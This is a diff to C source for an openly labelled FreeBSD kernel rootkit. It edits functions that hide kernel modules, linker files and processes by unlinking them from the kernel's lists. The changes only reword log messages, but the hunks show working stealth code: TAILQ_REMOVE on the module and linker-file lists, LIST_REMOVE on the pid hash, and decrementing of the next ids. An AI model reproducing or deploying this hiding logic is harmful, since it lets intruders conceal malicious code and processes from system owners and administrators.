@@ -60,11 +60,13 @@ hide_ko(char *ko_name)
 
 	sx_xlock(&modules_sx);
 
-	TAILQ_FOREACH(mod, &modules, link){
-		LOGI("Checking Module: %s\n", mod->name);
+	LOGI("[rootkit:hide_ko] Look for ko: %s.\n", ko_name);
+	TAILQ_FOREACH(mod, &modules, link)
+	{
+		LOGI("[rootkit:hide_ko] Found ko: %s.\n", mod->name);
 		if (strcmp(mod->name, ko_name) == 0)
 		{
-			LOGI("Found %s, Removing from modules list", mod->name);
+			LOGI("[rootkit:hide_ko] Remove ko: %s.\n", mod->name);
 			nextid--;
 			TAILQ_REMOVE(&modules, mod, link);
 			break;
@@ -88,13 +90,13 @@ hide_kld(char *kld_name)
 	mtx_lock(&Giant);
 	sx_slock(&kld_sx);
 
-	LOGI("Attempting to remove linker file %s\n", kld_name);
+	LOGI("[rootkit:hide_kld] Look for linker file: %s.\n", kld_name);
 	TAILQ_FOREACH(lf, &linker_files, link){
-		LOGI("Checking %s\n", lf->filename);
+		LOGI("[rootkit:hide_kld] Found linker file: %s.\n", lf->filename);
 		if(strcmp(lf->filename, kld_name) == 0){
+			LOGI("[rootkit:hide_kld] Remove linker file: %s.\n", lf->filename);
 			next_file_id--;
 			TAILQ_REMOVE(&linker_files,lf,link);
-			LOGI("Found and removing linker file\n");
 			break;
 		}
 	}
@@ -122,7 +124,7 @@ hide_process_by_id(pid_t id)
 	 * Better performance over pidhashtabl. */
 	LIST_FOREACH(p, PIDHASH(id), p_list)
 	{
-		LOGI("[rootkit:hide_process_by_id] Checking PID: %d\n", p->pid);
+		LOGI("[rootkit:hide_process_by_id] Found PID: %d\n", p->pid);
 		if (p->p_pid == id)
 		{
 			/* A process is either NEW, NORMAL, ZOMBIE
@@ -133,7 +135,7 @@ hide_process_by_id(pid_t id)
 				break;
 			}
 
-			LOGI("[rootkit:hide_process_by_id] Removing PID: %d\n", p->pid);
+			LOGI("[rootkit:hide_process_by_id] Hide PID: %d\n", p->pid);
 			PROC_LOCK(p);
 
 			LIST_REMOVE(p, p_list);
